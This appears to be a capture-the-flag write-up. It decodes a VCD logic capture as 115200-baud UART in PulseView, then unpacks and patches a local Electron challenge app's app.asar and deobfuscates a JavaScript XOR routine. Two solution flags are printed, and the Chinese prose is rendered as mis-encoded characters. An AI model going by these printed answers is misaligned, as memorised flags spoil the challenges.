#1548  1!
#1556  0!
#1566  1!
#1574  0!
#1600  1!
#1608  0!
#1618  1!
#1636  0!
#1652  1!
#1662  0!
#1678  1!
#1688  0!
#1704  1!
#1730  0!
#1740  1!
#1748  0!
#1756  1!
#1774  0!
#1792  1!
#1808  0!
#1826  1!
#1834  0!
#1844  1!
#1888  0!
#1896  1!
#1904  0!
#1914  1!
#1922  0!
#1940  1!
#1948  0!
#1966  1!
#1992  0!
#2000  1!
#2008  0!
#2018  1!
#2034  0!
#2052  1!
#2070  0!
#2086  1!
#2096  0!
#2122  1!
#2130  0!
#2140  1!
#2156  0!
#2174  1!
#2182  0!
#2192  1!
#2200  0!
#2226  1!
#2244  0!
#2260  1!
#2270  0!
#2278  1!
#2286  0!
#2312  1!
#2330  0!
#2348  1!
#2356  0!
#2364  1!
#2374  0!
#2392  1!
#2426  0!
#2434  1!
#2444  0!
#2452  1!
#2496  0!
#2504  1!
#2512  0!
#2522  1!
#2530  0!
#2548  1!
#2564  0!
#2574  1!
#2590  0!
#2608  1!
#2616  0!
#2660  1!
#2678  0!
#2696  1!
#2704  0!
#2748  1!
#2764  0!
#2782  1!
#2790  0!
#2816  1!
#2826  0!
#2842  1!
#2860  0!
#2868  1!
#2878  0!
#2886  1!
#2930  0!
#2938  1!
#2948  0!
#2956  1!
#2964  0!
#2990  1!
#3000  0!
#3008  1!
#3026  0!
#3042  1!
#3052  0!
#3060  1!
#3086  0!
#3094  1!
#3112  0!
#3130  1!
#3138  0!
#3148  1!
#3190  0!
#3200  1!
#3208  0!
#3216  1!
#3226  0!
#3234  1!
#3242  0!
#3268  1!
#3286  0!
#3304  1!
#3312  0!
#3356  1!
#3372  0!
#3390  1!
#3400  0!
#3416  1!
#3434  0!
#3442  1!
#3460  0!
#3478  1!
#3486  0!
#3494  1!
#3504  0!
#3530  1!
#3546  0!
#3564  1!
#3572  0!
#3582  1!
#3598  0!
#3624  1!
#3642  0!
#3652  1!
#3660  0!
#3668  1!
#3712  0!
#3720  1!
#3730  0!
#3738  1!
#3746  0!
#3772  1!
#3782  0!
#3790  1!
#3808  0!
#3824  1!
#3834  0!
#3850  1!
#3878  0!
#3886  1!
#3904  0!
#3912  1!
#3920  0!
#3946  1!
#3956  0!
#3964  1!
#3982  0!
#3998  1!
#4008  0!
#4016  1!
#4024  0!
#4050  1!
#4068  0!
#4086  1!
#4094  0!
#4102  1!
#4112  0!
#4130  1!
#4164  0!
#4172  1!
#4182  0!
#4190  1!
#4198  0!
#4208  1!
#4216  0!
#4224  1!
#4242  0!
#4260  1!
#4268  0!
#4276  1!
#4286  0!
#4312  1!
#4328  0!
#4346  1!
#4354  0!
#4364  1!
#4372  0!
#4380  1!
#4390  0!
#4398  1!
#4416  0!
#4434  1!
#4442  0!
#4450  1!
#4460  0!
#4494  1!
#4502  0!
#4520  1!
#4528  0!
#4538  1!
#4546  0!
#4554  1!
#4598  0!
#4606  1!
#4616  0!
#4634  1!
#4642  0!
#4650  1!
#4660  0!
#4694  1!
#5654
```

### 2. ÁêÜËß£Êñá‰ª∂ÂÜÖÂÆπ‰∏éÊ†ºÂºèËØÜÂà´

Êñá‰ª∂ÂÜÖÂÆπÂåÖÂê´‰ª• `$` ÂºÄÂ§¥ÁöÑÂ£∞ÊòéÂíå‰ª• `#` ÂºÄÂ§¥ÁöÑÊó∂Èó¥Êà≥Âèä‰ø°Âè∑ÂÄºÂèòÂåñ„ÄÇËøôÂº∫ÁÉàÊöóÁ§∫‰∫Ü‰∏ÄÁßçËÆ∞ÂΩïÊï∞Â≠óÁîµË∑Ø‰ªøÁúüÊàñÈÄªËæëÂàÜÊûê‰ª™ÊçïËé∑Êï∞ÊçÆÁöÑÊ†ºÂºè„ÄÇ

#### Â§¥ÈÉ®‰ø°ÊÅØÔºö

-   `$timescale 1 us $end`: ÂÆö‰πâÊó∂Èó¥Âçï‰Ωç‰∏∫ 1 ÂæÆÁßí (¬µs)„ÄÇ
-   `$var wire 1 ! 0 $end`: ÂÆö‰πâ‰∏Ä‰∏™Âêç‰∏∫ `0` ÁöÑ1‰Ωç `wire` (ÂØºÁ∫ø) ‰ø°Âè∑ÔºåÂÖ∂ÂÜÖÈÉ®Ê†áËØÜÁ¨¶‰∏∫ `!`„ÄÇ
-   `$var wire 1 ' 1 $end`: ÂÆö‰πâ‰∏Ä‰∏™Âêç‰∏∫ `1` (Ê≥®ÊÑèÂâçÈù¢ÊúâÁ©∫Ê†º) ÁöÑ1‰Ωç `wire` ‰ø°Âè∑ÔºåÂÖ∂ÂÜÖÈÉ®Ê†áËØÜÁ¨¶‰∏∫ `'`„ÄÇ
-   `$upscope $end` Âíå `$enddefinitions $end`: VCD Êñá‰ª∂ÁöÑÊ†áÂáÜÁªìÊûÑ„ÄÇ

#### ‰ø°Âè∑Êï∞ÊçÆÔºö

-   `#&lt;Êó∂Èó¥Êà≥&gt;`: Ë°®Á§∫Âú®ËØ•Êó∂Èó¥ÁÇπÂèëÁîü‰ø°Âè∑ÂèòÂåñ„ÄÇ
-   ‰æãÂ¶ÇÔºå`#0 1! 0'`: Âú®Êó∂Èó¥ 0¬µsÔºå‰ø°Âè∑ `!` (Âç≥‰ø°Âè∑ `0`) Âèò‰∏∫ `1`Ôºå‰ø°Âè∑ `'` (Âç≥‰ø°Âè∑ `1`) Âèò‰∏∫ `0`„ÄÇ
-   ÂêéÁª≠Â¶Ç `#792 0!` Ë°®Á§∫‰ø°Âè∑ `!` (‰ø°Âè∑ `0`) Âèò‰∏∫ `0`Ôºå‰ø°Âè∑ `'` (‰ø°Âè∑ `1`) Áä∂ÊÄÅ‰øùÊåÅ‰∏çÂèòÔºåÁõ¥Âà∞‰∏ã‰∏ÄÊ¨°ÊòæÂºèÊõ¥Êñ∞„ÄÇ

ÈÄöËøáËøô‰∫õÁâπÂæÅÔºåÂèØ‰ª•Âà§Êñ≠ËØ•Êñá‰ª∂ÊòØ **VCD (Value Change Dump)** Ê†ºÂºè„ÄÇËøôÁßçÊñá‰ª∂Â∏∏Áî®‰∫éËÆ∞ÂΩïÊï∞Â≠óÈÄªËæë‰ø°Âè∑ÈöèÊó∂Èó¥ÂèòÂåñÁöÑÊÉÖÂÜµ„ÄÇ

### 3. ‰ΩøÁî® PulseView Ëß£Á†Å

ÂØπ‰∫é VCD Êñá‰ª∂ÔºåÂèØ‰ª•‰ΩøÁî®ÈÄªËæëÂàÜÊûêËΩØ‰ª∂ PulseView (sigrok Â•ó‰ª∂ÁöÑ‰∏ÄÈÉ®ÂàÜ) ËøõË°åÂèØËßÜÂåñÂàÜÊûêÂíåËß£Á†Å„ÄÇ

#### Ê≠•È™§‰∏ÄÔºöÂØºÂÖ•Êï∞ÊçÆÂà∞ PulseView

1.  ÂêØÂä® PulseView„ÄÇ
2.  ÈÄöËøá 'File' -&gt; 'Open' (ÊàñÊãñÊãΩ) ÊâìÂºÄ `ezflag` Êñá‰ª∂„ÄÇPulseView ÈÄöÂ∏∏ËÉΩËá™Âä®ËØÜÂà´ VCD Ê†ºÂºè„ÄÇÂ¶ÇÊûúÈÅáÂà∞ËØÜÂà´ÈóÆÈ¢òÔºåÂèØÂ∞ùËØïÂ∞ÜÊñá‰ª∂ÂêéÁºÄÊîπ‰∏∫ `.vcd`„ÄÇ

#### Ê≠•È™§‰∫åÔºöÂàÜÊûêÊ≥¢ÂΩ¢Âπ∂Ê∑ªÂä† UART Ëß£Á†ÅÂô®

ÂØºÂÖ•ÂêéÔºå‰ºöÁúãÂà∞‰∏§‰∏™‰ø°Âè∑ÈÄöÈÅìÔºåÂØπÂ∫î VCD Êñá‰ª∂‰∏≠ÂÆö‰πâÁöÑ‰ø°Âè∑ `0` (Ê†áËØÜÁ¨¶ `!`) Âíå‰ø°Âè∑ `1` (Ê†áËØÜÁ¨¶ `'`Ôºâ„ÄÇÂú® PulseView ‰∏≠ÂèØËÉΩÊòæÁ§∫‰∏∫ D0, D1 Á≠â„ÄÇ

1.  **ËßÇÂØüÊ≥¢ÂΩ¢ÁâπÂæÅÔºö**
    ‰ªîÁªÜËßÇÂØü‰ø°Âè∑ `!` (Âú® PulseView ‰∏≠ÂèØËÉΩÊòØ D0) ÁöÑÊ≥¢ÂΩ¢„ÄÇÂÆÉÂú® `#0` Êó∂ÂàªÂàùÂßãÂÄº‰∏∫ `1`Ôºå‰πãÂêéÈöèÊó∂Èó¥ÂèëÁîü `0` Âíå `1` ÁöÑË∑≥Âèò„ÄÇËøôÁßçÁ©∫Èó≤Êó∂È´òÁîµÂπ≥ (Êàñ‰ΩéÁîµÂπ≥)ÔºåÊï∞ÊçÆ‰º†ËæìÊó∂Âá∫Áé∞‰∏ÄÁ≥ªÂàóÁîµÂπ≥Âø´ÈÄüÂàáÊç¢ÁöÑÊ®°ÂºèÔºåÈùûÂ∏∏Á¨¶Âêà**ÂºÇÊ≠•‰∏≤Ë°åÈÄö‰ø° (UART)** ÁöÑÁâπÂæÅ„ÄÇ
    *   Ê†πÊçÆ `#0 1! 0'`Ôºå‰ø°Âè∑ `!` (Êàë‰ª¨ÂÖ≥Ê≥®ÁöÑ D0) ÂàùÂßã‰∏∫ 1Ôºå‰ø°Âè∑ `'` ÂàùÂßã‰∏∫ 0„ÄÇÂêéÁª≠Êï∞ÊçÆ‰∏ªË¶ÅÊîπÂèòÁöÑÊòØ `!` ÁöÑÁä∂ÊÄÅ„ÄÇÂõ†Ê≠§Ôºå‰ø°Âè∑ `!` ÊûÅÊúâÂèØËÉΩÊòØ UART ÁöÑÊï∞ÊçÆÁ∫ø (TX/RX)„ÄÇ

2.  **Ê∑ªÂä† UART Ëß£Á†ÅÂô®Ôºö**
    *   ÁÇπÂáª PulseView Â∑•ÂÖ∑Ê†è‰∏äÁöÑ 'Add Decoder' ÂõæÊ†á„ÄÇ
    *   Âú®Ëß£Á†ÅÂô®ÂàóË°®‰∏≠ÊêúÁ¥¢Âπ∂Ê∑ªÂä† 'UART'„ÄÇ

#### Ê≠•È™§‰∏âÔºöÈÖçÁΩÆ UART Ëß£Á†ÅÂô®

ËøôÊòØËß£Á†ÅÊàêÂäüÁöÑÂÖ≥ÈîÆÊ≠•È™§„ÄÇ

1.  **Êò†Â∞Ñ‰ø°Âè∑Á∫øÔºö**
    *   Â∞Ü UART Ëß£Á†ÅÂô®ÁöÑ 'TX' (Êàñ 'RX') ÂºïËÑöËøûÊé•Âà∞Êàë‰ª¨ËÆ§‰∏∫ÊòØÊï∞ÊçÆÁ∫øÁöÑÈÄöÈÅìÔºåÂç≥‰ª£Ë°®‰ø°Âè∑ `!` (VCD Êñá‰ª∂‰∏≠ÁöÑ `0`ÔºåPulseView ‰∏≠ÁöÑ D0) ÁöÑÈÄöÈÅì„ÄÇ

2.  **Á°ÆÂÆöÊ≥¢ÁâπÁéá (Baud Rate)Ôºö**
    *   Ê≥¢ÁâπÁéáÊòØ UART ÈÄö‰ø°ÁöÑÊ†∏ÂøÉÂèÇÊï∞„ÄÇÂèØ‰ª•‰ªéÂ∏∏ËßÅÁöÑÊ≥¢ÁâπÁéáÂºÄÂßãÂ∞ùËØïÔºåÂ¶Ç 9600, 19200, 38400, 57600, 115200 bps„ÄÇ
    *   Âú® PulseView ‰∏≠‰øÆÊîπËß£Á†ÅÂô®ÁöÑÊ≥¢ÁâπÁéáËÆæÁΩÆÔºåËß£Á†ÅÁªìÊûú‰ºöÂÆûÊó∂Êõ¥Êñ∞„ÄÇÈÄöËøáËßÇÂØüËß£Á†ÅËæìÂá∫ÊòØÂê¶‰∏∫ÂèØËØªÂ≠óÁ¨¶ÊàñÊúâÊÑè‰πâÁöÑÊï∞ÊçÆÊù•Âà§Êñ≠Ê≥¢ÁâπÁéáÊòØÂê¶Ê≠£Á°Æ„ÄÇ
    *   ÁªèËøáÂ∞ùËØïÔºåÂΩìÊ≥¢ÁâπÁéáËÆæÁΩÆ‰∏∫ **115200 bps** Êó∂ÔºåËß£Á†ÅÂô®ËæìÂá∫‰∫Ü‰∏Ä‰∏≤Ê∏ÖÊô∞ÁöÑ ASCII Â≠óÁ¨¶Â∫èÂàóÔºåÂπ∂‰∏îÊ≤°ÊúâÈîôËØØÂ∏ß„ÄÇ

3.  **ÂÖ∂‰ªñÂèÇÊï∞ÔºàÊï∞ÊçÆ‰Ωç„ÄÅÊ†°È™å‰Ωç„ÄÅÂÅúÊ≠¢‰ΩçÔºâÔºö**
    *   UART ÈÄö‰ø°ÊúÄÂ∏∏ËßÅÁöÑÈÖçÁΩÆÊòØ **8 ‰∏™Êï∞ÊçÆ‰Ωç (Data bits: 8)**Ôºå**Êó†Ê†°È™å (Parity: None)**Ôºå**1 ‰∏™ÂÅúÊ≠¢‰Ωç (Stop bits: 1)**ÔºåÈÄöÂ∏∏Ë°®Á§∫‰∏∫ 8N1„ÄÇ
    *   ‰ΩøÁî® 115200 bps Ê≥¢ÁâπÁéáÂíå 8N1 ÈÖçÁΩÆÔºåËß£Á†ÅÁªìÊûúËâØÂ•Ω„ÄÇ

#### Ê≠•È™§ÂõõÔºöÊü•ÁúãËß£Á†ÅÁªìÊûú

Ê≠£Á°ÆÈÖçÁΩÆÂêéÔºåPulseView ‰ºöÂú®Ê≥¢ÂΩ¢‰∏ãÊñπÊòæÁ§∫Ëß£Á†ÅÂá∫ÁöÑÊï∞ÊçÆ„ÄÇ
![image-20250526134540784](https://7r1umphk.github.io/image/20250526134541010.webp)

Â∞ÜËß£Á†ÅÂ≠óÁ¨¶ÊãºÊé•ÔºåÂæóÂà∞ FlagÔºö
`flag{y0u_4r3_r3411y_600d_47_1061c_4n41y515!}`

## Á¨¨‰∫åÈÉ®ÂàÜÔºöÂàÜÊûê `ezelectron` Â∫îÁî®

‰∏ãËΩΩÂπ∂Ëß£Âéã `ezelectron-1.1.0-amd64-linux.zip` ÂéãÁº©ÂåÖÔºåËß£ÂéãÊü•ÁúãÂÖ∂ÁõÆÂΩïÁªìÊûÑÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd ezelectron
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron]
‚îî‚îÄ$ ll
total 242645
drwxr-xr-x 1 kali kali      4096 May 26 00:12 .
drwxr-xr-x 1 kali kali     12288 May 26 01:57 ..
-rwxr-xr-x 1 kali kali    147640 May 25 16:22 chrome_100_percent.pak
-rwxr-xr-x 1 kali kali 196984632 May 25 16:22 ezelectron
drwxr-xr-x 1 kali kali      4096 May 26 00:33 resources
```

ËøêË°åÂ∫îÁî®ÔºåÂèØ‰ª•ÁúãÂà∞ÂêØÂä®ÁïåÈù¢Ôºö
![1748239128506](https://7r1umphk.github.io/image/20250526135851284.webp)

ÁïåÈù¢Â∑¶‰æßÊòØ Vite.js (ÂâçÁ´ØÊûÑÂª∫Â∑•ÂÖ∑) ÁöÑ LogoÔºåÂè≥‰æßÊòØ Vue.js (JavaScript ÂâçÁ´ØÊ°ÜÊû∂) ÁöÑ Logo„ÄÇËøôË°®ÊòéËØ•Â∫îÁî®ÊòØ‰ΩøÁî® Electron Ê°ÜÊû∂ÔºåÂπ∂ÁªìÂêà Vite Âíå Vue.js ÂºÄÂèëÁöÑ„ÄÇ

### ÊñπÊ≥ï‰∏ÄÔºöÈÄöËøá‰øÆÊîπ‰∏ªËøõÁ®ãËÑöÊú¨ÂêØÁî®ÂºÄÂèëËÄÖÂ∑•ÂÖ∑ (È¢ÑÊúüËß£)

ÂØπ‰∫é Electron Â∫îÁî®Ôºå‰∏Ä‰∏™Â∏∏ËßÅÁöÑË∞ÉËØïÂíåÂàÜÊûêÂÖ•Âè£ÊòØÂÖ∂ÂÜÖÁΩÆÁöÑÂºÄÂèëËÄÖÂ∑•ÂÖ∑„ÄÇÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰øÆÊîπÂ∫îÁî®ÁöÑ‰∏ªËøõÁ®ãËÑöÊú¨Êù•ÈªòËÆ§ÂêØÂä®ÂÆÉ„ÄÇ

#### 1. Ëß£ÂåÖ `app.asar`Ôºö

Electron Â∫îÁî®ÁöÑÊ†∏ÂøÉÈÄªËæëÈÄöÂ∏∏ÊâìÂåÖÂú® `resources/app.asar` Êñá‰ª∂‰∏≠„ÄÇ`asar` ÊòØ‰∏ÄÁßçÂΩíÊ°£Ê†ºÂºè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron]
‚îî‚îÄ$ npm install -g asar
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron]
‚îî‚îÄ$ cd resources
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ ls -al
total 14348
drwxr-xr-x 1 kali kali        0 May 25 16:22 .
drwxr-xr-x 1 kali kali     4096 May 26 01:59 ..
-rwxr-xr-x 1 kali kali 14687457 May 25 16:22 app.asar
-rwxr-xr-x 1 kali kali       95 May 25 16:22 app-update.yml
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ asar extract app.asar app_unpacked
```

#### 2. ‰øÆÊîπ‰∏ªËøõÁ®ãËÑöÊú¨Ôºö

Ëß£ÂåÖÂêéÔºåÂú® `app_unpacked` ÁõÆÂΩï‰∏≠ÊâæÂà∞‰∏ªËøõÁ®ãËÑöÊú¨„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ cd app_unpacked
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/ezelectron/resources/app_unpacked]
‚îî‚îÄ$ ll
total 6
drwxr-xr-x 1 kali kali    0 May 26 02:02 .
drwxr-xr-x 1 kali kali    0 May 26 02:02 ..
drwxr-xr-x 1 kali kali    0 May 26 02:02 dist
- rwxr-xr-x 1 kali kali 1434 May 26 02:02 main.min.js
drwxr-xr-x 1 kali kali 4096 May 26 02:02 node_modules
- rwxr-xr-x 1 kali kali  187 May 26 02:02 package.json
```

‰ΩøÁî® `js-beautify`ÁæéÂåñ `main.min.js` ‰ª•‰æø‰∫éÈòÖËØªÂíå‰øÆÊîπÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/ezelectron/resources/app_unpacked]
‚îî‚îÄ$ js-beautify main.min.js &gt; main.beautified.js
```

ÁºñËæë `main.beautified.js`„ÄÇÂú®Á™óÂè£ÊòæÁ§∫ (`win.show()`) ‰πãÂâç/‰πãÂêéÔºåÊ∑ªÂä†‰ª•‰∏ã‰ª£Á†Å‰ª•ÊâìÂºÄÂºÄÂèëËÄÖÂ∑•ÂÖ∑Ôºö

```javascript
win.webContents.openDevTools();
```

![image-20250526140406708](https://7r1umphk.github.io/image/20250526140406895.webp)

‰øùÂ≠ò‰øÆÊîπÔºåÂπ∂Â∞ÜÁæéÂåñÂêéÁöÑÊñá‰ª∂ÈáçÂëΩÂêçÂõû `main.min.js` (Â¶ÇÊûú‰øÆÊîπÁöÑÊòØÁæéÂåñÁâà)„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/ezelectron/resources/app_unpacked]
‚îî‚îÄ$ mv main.min.js main.min.js.bak
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/ezelectron/resources/app_unpacked]
‚îî‚îÄ$ mv main.beautified.js main.min.js
```

#### 3. ÈáçÊñ∞ÊâìÂåÖÂπ∂ËøêË°åÔºö

ËøîÂõû `resources` ÁõÆÂΩïÔºåÂ∞Ü‰øÆÊîπÂêéÁöÑ `app_unpacked` ÁõÆÂΩïÈáçÊñ∞ÊâìÂåÖ‰∏∫ `app.asar`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/ezelectron/resources/app_unpacked]
‚îî‚îÄ$ cd .. 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ mv app.asar app.asar.bak
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ asar pack app_unpacked app.asar
```

Áé∞Âú®ÔºåËøîÂõû‰∏äÂ±ÇÁõÆÂΩïÂπ∂ËøêË°å‰øÆÊîπÂêéÁöÑ `ezelectron` Â∫îÁî®Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron/resources]
‚îî‚îÄ$ cd ..
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/ezelectron]
‚îî‚îÄ$ ./ezelectron
```

Â∫îÁî®ÂêØÂä®Êó∂ÔºåÂºÄÂèëËÄÖÂ∑•ÂÖ∑‰ºöËá™Âä®ÊâìÂºÄ„ÄÇÂú® ÂÖÉÁ¥† Ê†áÁ≠æÈ°µ‰∏≠Ê£ÄÊü• HTML ÁªìÊûÑ„ÄÇÊ≥®ÊÑèÂà∞ Vue Logo (`class='logo vue'`) ÁöÑ `&lt;img&gt;` Ê†áÁ≠æÔºåÂÖ∂ `alt` Â±ûÊÄßÂåÖÂê´ Flag„ÄÇ
![image-20250526140951570](https://7r1umphk.github.io/image/20250526140951753.webp)

Flag: `HMV{h3ll0_fr0m_3l3c7r0n}`

### ÊñπÊ≥ï‰∫åÔºöÈÄÜÂêëÂàÜÊûêÊ∏≤ÊüìËøõÁ®ã JavaScript

Ê≠§ÊñπÊ≥ï‰∏ç‰æùËµñ‰øÆÊîπ‰∏ªËøõÁ®ãÔºåËÄåÊòØÁõ¥Êé•ÂàÜÊûêÊ∏≤ÊüìËøõÁ®ãÂä†ËΩΩÁöÑ JavaScript ‰ª£Á†Å„ÄÇ

#### 1. ÂÆö‰ΩçÊ∏≤ÊüìËøõÁ®ãËÑöÊú¨Ôºö

Âú®‰πãÂâçËß£ÂåÖÁöÑ `app_unpacked/dist/` ÁõÆÂΩï‰∏ãÔºåÂèØ‰ª•ÊâæÂà∞ `index.html`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/ezelectron/resources/app_unpacked/dist]
‚îî‚îÄ$ cat index.html
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
  &lt;head&gt;
    &lt;meta charset='UTF-8' /&gt;
    &lt;link rel='icon' type='image/svg+xml' href='/vite.svg' /&gt;
    &lt;meta name='viewport' content='width=device-width, initial-scale=1.0' /&gt;
    &lt;title&gt;ezelectron&lt;/title&gt;
    &lt;script type='module' crossorigin src='./assets/index-CyqsCDPp.js'&gt;&lt;/script&gt; 
    &lt;link rel='stylesheet' crossorigin href='./assets/index-FMFiDxpK.css'&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div id='app'&gt;&lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

‰∏ªË¶ÅÁöÑÂâçÁ´ØÈÄªËæë‰Ωç‰∫é `assets/index-CyqsCDPp.js`„ÄÇ

#### 2. ÁæéÂåñÂπ∂ÂàÜÊûêËÑöÊú¨Ôºö

ËØ•ËÑöÊú¨ÊòØÊ∑∑Ê∑ÜËøáÁöÑ„ÄÇ‰ΩøÁî® `js-beautify` ËøõË°åÁæéÂåñÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/resources/app_unpacked/dist/assets]
‚îî‚îÄ$ js-beautify index-CyqsCDPp.js &gt; index.beautified.js
```

ÊâìÂºÄ `index.beautified.js` ËøõË°åÂàÜÊûê„ÄÇ

#### 3. ÁêÜËß£‰ª£Á†ÅÊ∑∑Ê∑Ü‰∏éÂÆö‰ΩçÂÖ≥ÈîÆÈÄªËæëÔºö

*   **Â≠óÁ¨¶‰∏≤Ê∑∑Ê∑ÜÔºö** ‰ª£Á†Å‰∏≠Â≠òÂú®‰∏Ä‰∏™Â§ßÂûãÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑÂíå‰∏Ä‰∏™Ëß£ÂØÜ/ÂºïÁî®ÂáΩÊï∞„ÄÇ
*   **ÂèòÈáèÂêçÊ∑∑Ê∑ÜÔºö** ÂèòÈáèÂíåÂáΩÊï∞ÂêçË¢´ÊõøÊç¢‰∏∫Â¶Ç `a0_0x...` Êàñ `_0x...` ÁöÑÂΩ¢Âºè„ÄÇ
*   **ÂÆö‰ΩçVueÁªÑ‰ª∂Ôºö** ÂØªÊâæ Vue ÁªÑ‰ª∂ÂÆö‰πâÔºåÈÄöÂ∏∏ÊòØ‰∏Ä‰∏™ÂåÖÂê´ `setup` ÂáΩÊï∞ÁöÑÂØπË±°„ÄÇÂú®Êú¨‰æã‰∏≠ÔºåÂØπË±° `a0_0x508586` ÊòØ‰∏Ä‰∏™ Vue ÁªÑ‰ª∂„ÄÇ
*   Âú®ÂÖ∂ `setup` ÂáΩÊï∞ (`_0x57c87a`) ‰∏≠ÔºåÊ≥®ÊÑèÂà∞‰∏Ä‰∏™Âêç‰∏∫ `_0x8d8f10` ÁöÑÂÜÖÈÉ®ÂáΩÊï∞„ÄÇÊ≠§ÂáΩÊï∞Êé•Êî∂‰∏§‰∏™Êï∞ÁªÑ (`_0x1c013b` Âíå `_0x76c466`) ‰Ωú‰∏∫ËæìÂÖ•ÔºåÂπ∂ËøõË°å‰∫Ü‰∏ÄÁ≥ªÂàóÊìç‰ΩúÊù•ÁîüÊàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤„ÄÇËøô‰∏™ÁîüÊàêÁöÑÂ≠óÁ¨¶‰∏≤ÊúÄÁªàË¢´ËÆæÁΩÆ‰∏∫ Vue logo ÂõæÁâáÁöÑ `alt` Â±ûÊÄß„ÄÇ

#### 4. ÈÄÜÂêë Flag ÁîüÊàêÁÆóÊ≥ïÔºö

ÂÖ≥ÈîÆ‰ª£Á†ÅÊÆµÂ¶Ç‰∏ã:

```javascript
_0x1c013b = [
    ÁúÅÁï•
];
_0x76c466 = [ÁúÅÁï• ];
function _0x8d8f10(_0x3816d4, _0xb6046) { 
    return _0x3816d4.flat() 
        .map((_0x39abff, _0x27f950) =&gt; 
            String.fromCharCode(
                (_0x39abff ^ _0xb6046[_0x27f950 % _0xb6046.length]) 
                - (0x1ba * -0x10 + -0xd3f * -0x2 + 0x123) 
            )
        )
        .join(''); 
}
```

#### 5. ËÆ°ÁÆóÊï∞ÁªÑÂÄºÂπ∂ÁºñÂÜôËß£ÂØÜËÑöÊú¨Ôºö

È¶ñÂÖàÔºåËÆ°ÁÆó `_0x1c013b` Âíå `_0x76c466` ÁöÑÂÆûÈôÖÊï∞ÂÄº„ÄÇÂèØ‰ª•Âú®ÊµèËßàÂô®ÊéßÂà∂Âè∞ÁéØÂ¢É‰∏≠ÊâßË°åËøô‰∫õÊï∞Â≠¶Ë°®ËææÂºè„ÄÇ

```javascript
const _0x1c013b = [
[-0x13 * -0x56 + 0x26ca + -0x2d13, -0x214e + 0x1ed4 + 0x6b * 0x7, -0x1bfc + 0x5 * -0xa1 + 0x1f35, 0x259 * -0xb + -0x203a + 0x1 * 0x3a8a, 0x1d8b + -0x1 * -0x1646 + 0x4b2 * -0xb, 0x1580 + -0x1f67 + -0xa3d * -0x1, 0x125d + 0x1440 + -0x59 * 0x6f, -0x104b * -0x1 + -0x5 * -0x83 + -0x12b5, 0x1ba8 + 0x9 * -0x2a9 + 0x7 * -0x7a, 0x21f * 0x11 + -0x1 * -0x1495 + -0x3847],
[-0x2501 * -0x1 + 0x1 * -0x255d + 0x80, 0x1 * 0x12b6 + -0x5a * 0x18 + -0x9d4, 0x1cf5 + -0x151d * 0x1 + -0x765, 0x11 * -0x143 + 0x6cc + -0x47 * -0x35, 0x2 * 0x900 + 0x23 * 0xf + 0x1 * -0x1402, 0x1 * 0x148b + -0x1b52 + 0x743, -0x8b9 + -0x1060 + -0x11a * -0x17, 0x7 * -0xf1 + 0x854 + -0x1b4, -0x1 * 0x75f + 0x16 * -0x76 + -0x286 * -0x7],
[-0xaee + 0xdc3 + 0x4 * -0xa7, -0x23d4 + -0xb2f + 0x2f34, -0x1 * 0x198e + -0xb64 + 0xcb * 0x2f, -0x22a6 * -0x1 + 0xe5e + -0x3100, 0x893 + 0x1 * 0x779 + 0x1 * -0xfd6]
];
console.log('_0x1c013b:', _0x1c013b);
const _0x76c466 = [0x1fda + -0x82e + 0xd * -0x1cc, 0x8a1 + -0x2 * -0x416 + 0x5 * -0x350, 0xcc * -0x19 + -0x1bf0 + -0x301f * -0x1, 0x1f29 + 0xf50 + -0x173c * 0x2, -0xdea * -0x1 + -0x2316 + 0xd * 0x1a6, -0x1c4c + 0x19dc + 0x1 * 0x2d2, 0x206e + 0x9 * 0x31 + -0xfe * 0x22, -0x1683 + -0x835 + 0x1f00];
console.log('_0x76c466:', _0x76c466);
```

ËøêË°åÊ≠§ËÑöÊú¨Ôºö

```
_0x1c013b:
[
[
25,
115,
20,
125,
43,
86,
6,
37,
97,
93
],
[
36,
114,
115,
12,
11,
124,
61,
9,
39
],
[
57,
49,
83,
4,
54
]
]
_0x76c466:
[
80,
61,
67,
1,
66,
98,
107,
72
]
```

ÁÑ∂ÂêéËß£

```
const a = [
    [25, 115, 20, 125, 43, 86, 6, 37, 97, 93],
    [36, 114, 115, 12, 11, 124, 61, 9, 39],
    [57, 49, 83, 4, 54]
];
const b = [80, 61, 67, 1, 66, 98, 107, 72];
const c = a.flat();
function decode(d, e) {
    let f = '';
    for (let g = 0; g &lt; d.length; g++) {
        const h = g % e.length;
        const i = (d[g] ^ e[h]) - 1;
        f += String.fromCharCode(i);
    }
    return f;
}
const flag = decode(c, b);
